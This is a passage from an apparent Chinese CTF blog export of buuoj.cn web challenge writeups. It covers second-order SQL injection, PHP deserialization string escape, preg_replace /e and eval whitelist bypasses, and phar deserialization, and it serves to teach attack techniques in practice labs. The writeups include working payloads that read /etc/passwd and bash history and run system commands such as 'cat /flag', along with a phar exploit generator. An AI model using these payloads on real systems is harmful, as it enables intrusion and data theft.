\"flag*\"`找一下flag位置\n![在这里插入图片描述](https://img-blog.csdnimg.cn/2020060711523933.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNzU2MzMz,size_16,color_FFFFFF,t_70)\n发现/tmp/flagoefiu4r93，读取即可\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20200607115427924.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNzU2MzMz,size_16,color_FFFFFF,t_70)\n","tags":["serialize","代码审计"],"categories":["buu刷题"]},{"title":"网鼎杯2018——Comment","url":"/2020/06/06/buu14——[wangdingbei 2018]Comment/","content":"\n平台：buuoj.cn\n打开靶机是个留言板\n发帖需要登录，只缺密码的后三位，burp爆破即可\n扫下目录\n![在这里插入图片描述](https://img-blog.csdnimg.cn/2020060610450529.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNzU2MzMz,size_16,color_FFFFFF,t_70)\ngit泄露，githacker源码下下来\nwrite_do.php\n显示不全\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20200606113833309.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNzU2MzMz,size_16,color_FFFFFF,t_70)\n历史文件恢复一下\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20200606113954115.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNzU2MzMz,size_16,color_FFFFFF,t_70)\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20200606114109122.png)\n完整代码如下\n\n```php\n<?php\ninclude \"mysql.php\";\nsession_start();\nif($_SESSION['login'] != 'yes'){\n    header(\"Location: ./login.php\");\n    die();\n}\nif(isset($_GET['do'])){\nswitch ($_GET['do'])\n{\ncase 'write':\n    $category = addslashes($_POST['category']);\n    $title = addslashes($_POST['title']);\n    $content = addslashes($_POST['content']);\n    $sql = \"insert into board\n            set category = '$category',\n                title = '$title',\n                content = '$content'\";\n    $result = mysql_query($sql);\n    header(\"Location: ./index.php\");\n    break;\ncase 'comment':\n    $bo_id = addslashes($_POST['bo_id']);\n    $sql = \"select category from board where id='$bo_id'\";\n    $result = mysql_query($sql);\n    $num = mysql_num_rows($result);\n    if($num>0){\n    $category = mysql_fetch_array($result)['category'];\n    $content = addslashes($_POST['content']);\n    $sql = \"insert into comment\n            set category = '$category',\n                content = '$content',\n                bo_id = '$bo_id'\";\n    $result = mysql_query($sql);\n    }\n    header(\"Location: ./comment.php?id=$bo_id\");\n    break;\ndefault:\n    header(\"Location: ./index.php\");\n}\n}\nelse{\n    header(\"Location: ./index.php\");\n}\n?>\n```\n可以看到addslashes给每个参数都进行了处理\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20200606132603676.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNzU2MzMz,size_16,color_FFFFFF,t_70)\n但数据库存入的数据是会自动做过滤处理的，也就是说数据还是会原样插入到数据库中![在这里插入图片描述](https://img-blog.csdnimg.cn/20200606133731798.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNzU2MzMz,size_16,color_FFFFFF,t_70)\n而这部分\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20200606133838938.png)\nmysql_fetch_array直接调用category，造成二次注入。\n#### 构造\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20200606134340401.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNzU2MzMz,size_16,color_FFFFFF,t_70)\n进入留言板在content构造*/#提交\n此时数据库语句是\n\n```php\n$sql = \"insert into comment\n            set category = 'aaa',content=database(),/*',\n                content = '*/#',\n                bo_id = '$bo_id'\";\n```\n后面的`*/#`和前一个末尾`/*`拼接把后面的都注释掉\n就成了\n```php\n$sql = \"insert into comment\n            set category = 'aaa',\n            content=database(),\n```\n成功读取数据库\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20200606134724177.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNzU2MzMz,size_16,color_FFFFFF,t_70)\n#### 解题\nload_file读文件位置\n```php\naaa',content=(select( load_file('/etc/passwd'))),/*\n```\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20200606135704949.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNzU2MzMz,size_16,color_FFFFFF,t_70)\n查看使用过的系统命令\n\n```php\naaa',content=(select(load_file(\"/home/www/.bash_history\"))),/*\n```\n\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20200606135852883.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNzU2MzMz,size_16,color_FFFFFF,t_70)\n十六进制读.DS.Store\n\n```php\naaa',content=(select hex(load_file(\"/tmp/html/.DS_Store\"))),/*\n```\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20200606140209997.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNzU2MzMz,size_16,color_FFFFFF,t_70)\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20200606140304937.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNzU2MzMz,size_16,color_FFFFFF,t_70)\n读flag_8946e1ff1ee3e40f.php\n\n```php\naaa',content=(select hex(load_file('/var/www/html/flag_8946e1ff1ee3e40f.php'))),/*\n```\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20200606140416124.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNzU2MzMz,size_16,color_FFFFFF,t_70)\nps:tmp/html文件下读出来的flag是假的\n解码即得flag\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20200606141148586.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNzU2MzMz,size_16,color_FFFFFF,t_70)\n","tags":["sql","代码审计"],"categories":["buu刷题"]},{"title":"安洵杯2019——easy_serialize_php","url":"/2020/06/05/buu13——[anxunbei 2019]easy_serialize_php/","content":"\n平台： buuoj.cn\n打开靶机得源码\n\n```php\n<?php\n\n$function = @$_GET['f'];\n\nfunction filter($img){\n    $filter_arr = array('php','flag','php5','php4','fl1g');\n    $filter = '/'.implode('|',$filter_arr).'/i';\n    return preg_replace($filter,'',$img);\n}\n\n\nif($_SESSION){\n    unset($_SESSION);\n}\n\n$_SESSION[\"user\"] = 'guest';\n$_SESSION['function'] = $function;\n\nextract($_POST);\n\nif(!$function){\n    echo '<a href=\"index.php?f=highlight_file\">source_code</a>';\n}\n\nif(!$_GET['img_path']){\n    $_SESSION['img'] = base64_encode('guest_img.png');\n}else{\n    $_SESSION['img'] = sha1(base64_encode($_GET['img_path']));\n}\n\n$serialize_info = filter(serialize($_SESSION));\n\nif($function == 'highlight_file'){\n    highlight_file('index.php');\n}else if($function == 'phpinfo'){\n    eval('phpinfo();'); //maybe you can find something in here!\n}else if($function == 'show_image'){\n    $userinfo = unserialize($serialize_info);\n    echo file_get_contents(base64_decode($userinfo['img']));\n}\n```\n这道题与[\\[0CTF 2016\\]piapiapia](https://blog.csdn.net/qq_43756333/article/details/106420509)有些相似，都是通过不当的处理将自己原来的结构改变而造成的漏洞\n分析下代码。\nget一个参数f，这个通过f=phpinfo可以打印出phpinfo();\n获取到关键信息\n![在这里插入图片描述](https://img-blog.csdnimg.cn/2020060508293358.png)\nbase_encode(d0g3_f1ag.php)=ZDBnM19mMWFnLnBocA==\n那么想办法读取这个文件\n看最后一部分\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20200605083801311.png)\n当function的值为show_image时，对\\$serialize_info反序列化，打印出\\$userinfo中base解码后的img参数，$serialize_info是经过过滤之后的\\$_session\n![在这里插入图片描述](https://img-blog.csdnimg.cn/2020060508341278.png)\n$_session有三个参数user，function，img\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20200605083614372.png)\n传入的img_path会被sha1加密再base64编码再给\\$_session[img]，没指定的话就直接base_encode('guest.img.png')\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20200605083724879.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNzU2MzMz,size_16,color_FFFFFF,t_70)\n有两种payload\n第一种：\n\n```php\n_SESSION[user]=flagflagflagflagflagflag&_SESSION[function]=a\";s:3:\"img\";s:20:\"ZDBnM19mMWFnLnBocA==\";s:2:\"dd\";s:1:\"a\";}\n```\n分析一下\n指定了各个参数的值，正常的序列化过程为\n\n```php\n<?php\n$_SESSION[\"user\"]='flagflagflagflagflagflag';\n$_SESSION[\"function\"]='a\";s:3:\"img\";s:20:\"ZDBnM19mMWFnLnBocA==\";s:2:\"dd\";s:1:\"a\";}';\n$_SESSION[\"img\"]='ZDBnM19mMWFnLnBocA==';\n$_SESSION[\"img\"] = base64_encode('guest_img.png');\necho serialize($_SESSION);\n```\n\n```php\na:3:{s:4:\"user\";s:24:\"flagflagflagflagflagflag\";s:8:\"function\";s:59:\"a\";s:3:\"img\";s:20:\"ZDBnM19mMWFnLnBocA==\";s:2:\"dd\";s:1:\"a\";}\";s:3:\"img\";s:20:\"Z3Vlc3RfaW1nLnBuZw==\";}\n```\n\n但由于过滤机制，那么序列化之后\n![在这里插入图片描述](https://img-blog.csdnimg.cn/2020060510475531.png)\n原先flagflagflagflagflagflag的位置置空，那么序列化就会向后读取24个字符满足序列化格式，\n\n```php\na:3:{s:4:\"user\";s:24:\"\";s:8:\"function\";s:59:\"a\";s:3:\"img\";s:20:\"ZDBnM19mMWFnLnBocA==\";s:2:\"dd\";s:1:\"a\";}\";s:3:\"img\";s:20:\"ZZ3Vlc3RfaW1nLnBuZw==\";}\n```\n那么此时反序列之后就变成了\n![在这里插入图片描述](https://img-blog.csdnimg.cn/2020060510485989.png)\n后面的`\";s:3:\"img\";s:20:\"Z3Vlc3RfaW1nLnBuZw==\";}`由于序列化格式已经满足就被忽略了\n也就是说我们现在可以操作img修改序列化进程，后面的`s:3:\"img\";s:20:\"ZDBnM19mMWFnLnBocA==\";`就可以正常反序列化再由`file_get_contents(base64_decode($userinfo['img']))`打印出来\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20200605102951188.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNzU2MzMz,size_16,color_FFFFFF,t_70)\n提示在d0g3_fllllllag里，\t`base_encode(/d0g3_fllllllag)=L2QwZzNfZmxsbGxsbGFn`修改一下payload即可\n\n```php\n_SESSION[user]=flagflagflagflagflagflag&_SESSION[function]=a\";s:3:\"img\";s:20:\"L2QwZzNfZmxsbGxsbGFn\";s:2:\"dd\";s:1:\"a\";}\n```\n![在这里插入图片描述](https://img-blog.csdnimg.cn/2020060510363772.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNzU2MzMz,size_16,color_FFFFFF,t_70)\n第二种payload\n\n```php\n_SESSION[flagphp]=;s:1:\"1\";s:3:\"img\";s:20:\"ZDBnM19mMWFnLnBocA==\";}\n```\n正常序列化过程\n\n```php\n<?php\n$_SESSION['flagphp']=';s:1:\"1\";s:3:\"img\";s:20:\"ZDBnM19mMWFnLnBocA==\";}';\n$_SESSION['img'] = base64_encode('guest_img.png');\necho serialize($_SESSION);\n//a:2:{s:7:\"flagphp\";s:48:\";s:1:\"1\";s:3:\"img\";s:20:\"ZDBnM19mMWFnLnBocA==\";}\";s:3:\"img\";s:20:\"Z3Vlc3RfaW1nLnBuZw==\";}\n\n```\n此时flagphp被置空\n\n```php\na:2:{s:7:\"\";s:48:\";s:1:\"1\";s:3:\"img\";s:20:\"ZDBnM19mMWFnLnBocA==\";}\";s:3:\"img\";s:20:\"Z3Vlc3RfaW1nLnBuZw==\";}\n```\n第一个元素把`\";s:48:`包含起来作为元素名，后面`\";s:3:\"img\";s:20:\"Z3Vlc3RfaW1nLnBuZw==\";}`自动忽略，序列化重新排列\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20200605105042579.png)\nimg就可正常打印出来了\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20200605105146825.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNzU2MzMz,size_16,color_FFFFFF,t_70)\n同样修改下base64文件名即可。\n","tags":["代码审计","反序列化字符串逃逸"],"categories":["buu刷题"]},{"title":"BJDCTF2020——ZJCTF，不过如此","url":"/2020/06/04/buu12——[BJDCTF2020]ZJCTF，不过如此/","content":"\n平台：buuoj.cn\n打开靶机得源码\n\n```php\n<?php\n\nerror_reporting(0);\n$text = $_GET[\"text\"];\n$file = $_GET[\"file\"];\nif(isset($text)&&(file_get_contents($text,'r')===\"I have a dream\")){\n    echo \"<br><h1>\".file_get_contents($text,'r').\"</h1></br>\";\n    if(preg_match(\"/flag/\",$file)){\n        die(\"Not now!\");\n    }\n\n    include($file);  //next.php\n    \n}\nelse{\n    highlight_file(__FILE__);\n}\n?>\n```\n这里和ZJCTF2019一道题一样，直接data协议+php://fliter读next.php\n\n```\n?text=data://text/plain,I have a dream&file=php://filter/read=convert.base64-encode/resource=next.php\n```\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20200604090758737.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNzU2MzMz,size_16,color_FFFFFF,t_70)\n解码得\n\n```php\n<?php\n$id = $_GET['id'];\n$_SESSION['id'] = $id;\n\nfunction complex($re, $str) {\n    return preg_replace(\n        '/(' . $re . ')/ei',\n        'strtolower(\"\\\\1\")',\n        $str\n    );\n}\n\n\nforeach($_GET as $re => $str) {\n    echo complex($re, $str). \"\\n\";\n}\n\nfunction getFlag(){\n\t@eval($_GET['cmd']);\n}\n\n```\n preg_replace 使用了 /e 模式，导致可以代码执行，可以参考[深入研究preg_replace与代码执行](https://xz.aliyun.com/t/2557)\n 直接拿payload\n `?\\S*=(要执行的代码)`\n next.php最后定义了一个代码执行函数getFlag()\n 那么动态函数执行拼接一下\n `?\\S*=${getFlag()}&cmd=system('ls /');`\n ![在这里插入图片描述](https://img-blog.csdnimg.cn/2020060412013919.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNzU2MzMz,size_16,color_FFFFFF,t_70)\n 得到flag\n ![在这里插入图片描述](https://img-blog.csdnimg.cn/20200604120200149.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNzU2MzMz,size_16,color_FFFFFF,t_70)\n","tags":["代码审计"],"categories":["buu刷题"]},{"title":"CISCN2019初赛——Love_Math","url":"/2020/06/03/buu11——[CISCN 2019 初赛]Love Math/","content":"\n平台：buuoj.cn\n打开靶机源码如下\n\n```php\n<?php\nerror_reporting(0);\n//听说你很喜欢数学，不知道你是否爱它胜过爱flag\nif(!isset($_GET['c'])){\n    show_source(__FILE__);\n}else{\n    //例子 c=20-1\n    $content = $_GET['c'];\n    if (strlen($content) >= 80) {\n        die(\"太长了不会算\");\n    }\n    $blacklist = [' ', '\\t', '\\r', '\\n','\\'', '\"', '`', '\\[', '\\]'];\n    foreach ($blacklist as $blackitem) {\n        if (preg_match('/' . $blackitem . '/m', $content)) {\n            die(\"请不要输入奇奇怪怪的字符\");\n        }\n    }\n    //常用数学函数http://www.w3school.com.cn/php/php_ref_math.asp\n    $whitelist = ['abs', 'acos', 'acosh', 'asin', 'asinh', 'atan2', 'atan', 'atanh', 'base_convert', 'bindec', 'ceil', 'cos', 'cosh', 'decbin', 'dechex', 'decoct', 'deg2rad', 'exp', 'expm1', 'floor', 'fmod', 'getrandmax', 'hexdec', 'hypot', 'is_finite', 'is_infinite', 'is_nan', 'lcg_value', 'log10', 'log1p', 'log', 'max', 'min', 'mt_getrandmax', 'mt_rand', 'mt_srand', 'octdec', 'pi', 'pow', 'rad2deg', 'rand', 'round', 'sin', 'sinh', 'sqrt', 'srand', 'tan', 'tanh'];\n    preg_match_all('/[a-zA-Z_\\x7f-\\xff][a-zA-Z_0-9\\x7f-\\xff]*/', $content, $used_funcs);  \n    foreach ($used_funcs[0] as $func) {\n        if (!in_array($func, $whitelist)) {\n            die(\"请不要输入奇奇怪怪的函数\");\n        }\n    }\n    //帮你算出答案\n    eval('echo '.$content.';');\n}\n```\n\\$content限制了长度\n\\$blacklist过滤了一些字符\n\\$whitelist过滤了一些单词\n#### 前置知识\n\n> base_convert() 函数：在任意进制之间转换数字。\ndechex() 函数：把十进制转换为十六进制。\nhex2bin() 函数：把十六进制值的字符串转换为 ASCII 字符。\n#### 解题\n一、\n\n```php\npayload:\n?c=$pi=base_convert(37907361743,10,36)(dechex(1598506324));($$pi){pi}(($$pi){abs})&pi=system&abs=ls%20/\n\n```\n分段看\n\n```php\nbase_convert(37907361743,10,36) = hex2bin\ndechex(1598506324) = 5f474554\nhex2bin('5f474554') = _GET\n($$pi){pi}(($$pi){abs}) = $_GET{pi}($_GET{abs})\n($$pi){pi}(($$pi){abs})&pi=system&abs=cat%20/flag => $_GET{system}($_GET{cat%20/flag})=>system('cat%20/flag')\n```\n二、\n\n```php\n?c=$pi=(is_nan^(6).(4)).(tan^(1).(5));$pi=$$pi;$pi{pi}($pi{abs})&0=system&1=cat%20/flag\n```\n\n```php\n(is_nan^(6).(4)).(tan^(1).(5)) = _GET\n($$pi){pi}(($$pi){abs}) = $_GET{pi}($_GET{abs})\n($$pi){pi}(($$pi){abs})&pi=system&abs=cat%20/flag => $_GET{system}($_GET{cat%20/flag})=>system('cat%20/flag')\n```\n关于PHP Math 函数\n可用\n\n```php\n<?php\n$payload = ['abs', 'acos', 'acosh', 'asin', 'asinh', 'atan2', 'atan', 'atanh',  'bindec', 'ceil', 'cos', 'cosh', 'decbin' , 'decoct', 'deg2rad', 'exp', 'expm1', 'floor', 'fmod', 'getrandmax', 'hexdec', 'hypot', 'is_finite', 'is_infinite', 'is_nan', 'lcg_value', 'log10', 'log1p', 'log', 'max', 'min', 'mt_getrandmax', 'mt_rand', 'mt_srand', 'octdec', 'pi', 'pow', 'rad2deg', 'rand', 'round', 'sin', 'sinh', 'sqrt', 'srand', 'tan', 'tanh'];\nfor($k=1;$k<=sizeof($payload);$k++){\n    for($i = 0;$i < 9; $i++){\n        for($j = 0;$j <=9;$j++){\n            $exp = $payload[$k] ^ $i.$j;\n            echo($payload[$k].\"^$i$j\".\"==>$exp\");\n            echo \"       \";\n        }\n    }\n}\n?>\n```\n可对应查询相关字符\n三、\n\n```php\n$pi=base_convert,$pi(696468,10,36)($pi(8768397090111664438,10,30)(){1})\n```\n\n```php\n$pi(696468,10,36) = exec\n$pi(8768397090111664438,10,30) = getallheaders\n$pi=base_convert,$pi(696468,10,36)($pi(8768397090111664438,10,30)(){1}) = exec(getallheaders(){1})\n```\n\n> getallheaders — 获取全部 HTTP 请求头信息\n\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20200603174759653.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNzU2MzMz,size_16,color_FFFFFF,t_70)\n抓包重放\n在请求头加上cat /flag\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20200603181824494.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNzU2MzMz,size_16,color_FFFFFF,t_70)\n","tags":["代码审计"],"categories":["buu刷题"]},{"title":"CISCN2019华北赛区Day1_Web1——Dropbox","url":"/2020/06/02/buu10——[CISCN2019 华北赛区 Day1 Web1]Dropbox/","content":"\n平台：buuoj.cn\n打开靶机注册登录之后是一个管理面板，有上传功能\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20200602191853312.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNzU2MzMz,size_16,color_FFFFFF,t_70)\n上传文件试试看\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20200602192033417.png)\n可以下载，抓个包有任意文件下载\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20200602193106535.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNzU2MzMz,size_16,color_FFFFFF,t_70)\n把文件都下下来\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20200602201652807.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNzU2MzMz,size_16,color_FFFFFF,t_70)\n\n### 考点\nphar反序列化\nclass.php中定义了三个类：User，Filelist，File\nUser类中除了三个用户处理函数外，在结束对象时会自动执行__destruct函数调用close()\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20200602210314788.png)\nFilelist类中存在一个特别的魔术方法，__call()\n\n> PHP5 的对象新增了一个专用方法 __call()，这个方法用来监视一个对象中的其它方法。如果你试着调用一个对象中不存在或被权限控制中的方法，__call 方法将会被自动调用。该函数会把不可调用的名作为第一个参数，方法作为第二个参数传入__call方法中执行\n\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20200602210535465.png)\n该方法遍历files数组，对每一个file变量执行一次\\$func，然后将结果存进\\$results数组。\n最后结束时调用_destruct打印出\\$result和\\$func的信息\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20200602211852220.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNzU2MzMz,size_16,color_FFFFFF,t_70)\nFile类中定义了一个和User类中的同名函数close()，直接获取文件内容\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20200602210834478.png)\n从close()函数入手。\n这个函数和Users中最后db调用的close()同名，File和Filelist中没有db变量，因此当db是FileList对象的一个变量时，User对象就会调用destruct。\n接着destruct函数触发FileList的close()，然而Filelist中没有close方法，因此call()函数被调用，close()函数被传入call执行。\nFilelist对象销毁时，最后的destruct函数就会自动执行，从而打印出__call中传入的\\$result和\\$func的信息，这就可以打印出flag的值\npoc如下\n\n```php\n<?php\nclass User {\n    public $db;\n}\nclass File {\n    public $filename;\n}\nclass FileList {\n    private $files;\n    public function __construct() {\n        $file = new File();\n        $file->filename = \"/flag.txt\";\n        $this->files = array($file);\n    }\n}\n\n$a = new User();\n$a->db = new FileList();\n\n$phar = new Phar(\"phar.phar\"); //后缀名必须为phar\n\n$phar->startBuffering();\n\n$phar->setStub(\"<?php __HALT_COMPILER(); ?>\"); //设置stub\n\n$o = new User();\n$o->db = new FileList();\n\n$phar->setMetadata($a); //将自定义的meta-data存入manifest\n$phar->addFromString(\"exp.txt\", \"test\"); //添加要压缩的文件\n//签名自动计算\n$phar->stopBuffering();\n?>\n```\n关于这里为什么是flag.txt，有师傅说是前面任意文件下载代码给了提示\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20200602220016980.png)\n禁止下载flag.*的文件\n\n执行生成phar文件\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20200602220100377.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNzU2MzMz,size_16,color_FFFFFF,t_70)\n回到题目，将生成的phar文件上传\n这里因为有文件类型检测，抓包改文件类型即可\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20200602220407951.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNzU2MzMz,size_16,color_FFFFFF,t_70)\n然后由于download中\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20200602221328918.png)\n无法读取根目录的文件，所以只能利用delete\n抓取删除的包用phar://协议读phar.gif文件即可\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20200602220704674.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNzU2MzMz,size_16,color_FFFFFF,t_70)\n\n","tags":["phar","代码审计"],"categories":["buu刷题"]},{"title":"Phar以及phar对象注入","url":"/2020/06/02/Phar/","content":"\n#### 什么是phar\n\n> PHAR（PHP归档）文件是一种打包格式，通过将许多PHP代码文件和其他资源（例如图像，样式表等）捆绑到一个归档文件中来实现应用程序和库的分发。\n>\n> <!-- more -->\n>\n> 每个归档都包含三个部分：\n>\n> 1. 存根(Stub) —— 一个可以引导归档的PHP文件。存根必须包含`__HALT_COMPILER();`语句，并且默认存根拥有在不启用PHAR扩展的情况下运行PHAR文件的能力。\n> 2. 清单 —— 清单详细说明了存归档的内容。\n> 3. 文件内容 —— 归档中包含的原始文件\n>\n> 另外，PHAR格式还可以包括用于验证PHAR完整性的签名。\n\nPhar 归档可由 PHP 本身处理，因此不需要使用额外的工具来创建或使用，使用php脚本就能创建或提取它。\n\n#### 生成一个phar文件\n\n首先开启php.ini的phar扩展\n\n![image-20200602174306490](/images/image-20200602174306490.png)\n\n示例：\n\n创建两个文件如下\n\n![image-20200602181914631](/images/image-20200602181914631.png)\n\ncreatephar.php代码：\n\n```php\n<?php\n$phar = new Phar('phar.phar');//生成新的phar文件\n$phar->buildFromDirectory(__DIR__.'\\\\');//源码目录\n//$phar->compressFiles(Phar::GZ);可以选择添加压缩方式\n$phar->setStub($phar->createDefaultStub('index.php'));//设置存根，没有设置这个存根文件的话，默认寻找的文件为index.php。\n```\n\n生成\n\n![image-20200602183306239](/images/image-20200602183306239.png)\n\n我们可以直接加载phar文件的单独文件：\n\n![image-20200602183654213](/images/image-20200602183654213.png)\n\n![image-20200602183718537](/images/image-20200602183718537.png)\n\n当然也能还原(无压缩方式)\n\n```php\n<?php\n$phar = new Phar('phar.phar');\n$phar->extractTo('huanyuan');//路径\n```\n\n![image-20200602184946407](/images/image-20200602184946407.png)\n\n#### phar对象注入\n\nPHP文件操作允许使用各种URL协议去访问文件路径如data://，zlib://，或php://，phar://也是其中一种。\n\n##### 成因\n\nPhar文件可以包含序列化格式的元数据，[扒张图](https://www.freebuf.com/articles/web/182231.html)\n\n![1.png](https://image.3001.net/images/20180827/1535343254_5b837a96d90ac.png!small)\n\n所以如果我们通过 phar:// 对我们现有的Phar文件执行文件操作，则其序列化元数据将被反序列化。假如攻击者可以在`ìnclude()`，`fopen()`，`file_get_contents()`，`file()`等操作中控制完整的文件路径，就可以通过`phar://`注入并获得代码执行，造成严重的安全漏洞。\n\n实战：[[CISCN2019 华北赛区 Day1 Web1]Dropbox](https://blog.csdn.net/qq_43756333/article/details/106503047)\n\n","tags":["phar"],"categories":["PHP"]},{"title":"BJDCTF2020——Mark_loves_cat","url":"/2020/06/01/buu9——[BJDCTF2020]Mark loves cat/","content":"\n平台：buuoj.cn\n打开靶机\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20200601095355117.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNzU2MzMz,size_16,color_FFFFFF,t_70)\n先扫目录，发现git泄露\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20200601095518922.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNzU2MzMz,size_16,color_FFFFFF,t_70)\ngithack下下来\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20200601095632305.png)\n看下这两个php文件\n![在这里插入图片描述](https://img-blog.csdnimg.cn/20200601095658442.png)\nflag.php读取flag，index.php前端代码后php关键代码如下\n\n```php\n<?php\n\ninclude 'flag.php';\n\n$yds = \"dog\";\n$is = \"cat\";\n$handsome = 'yds';\n\nforeach($_POST as $x => $y){\n    $$x = 